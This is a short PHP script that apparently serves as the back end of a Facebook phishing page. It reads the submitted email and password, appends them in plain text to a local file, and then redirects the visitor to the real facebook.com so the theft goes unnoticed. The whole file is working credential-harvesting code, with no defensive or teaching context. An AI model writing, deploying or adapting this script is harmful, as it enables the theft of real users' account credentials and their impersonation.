<?php
   
      /* echo  $_POST['email']. "<br />";
      echo $_POST['pass']; */
	  $username = $_POST['email'];
	  $password = $_POST['pass'];
	  
	//  echo "Username is ".$username. "<br />";
	// echo "Password is ".$password;
	 
	
	$myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
	

	
	//fwrite($myfile, "Username=$username, Password=$password" );
	$data="Username=$username, Password=$password ";
	
			
			file_put_contents('myfile', $data, FILE_APPEND);	
			//echo "\n";
			fclose($myfile);
			header("Location: https://www.facebook.com/");
      
      exit();
	  
	
        
 
   
?>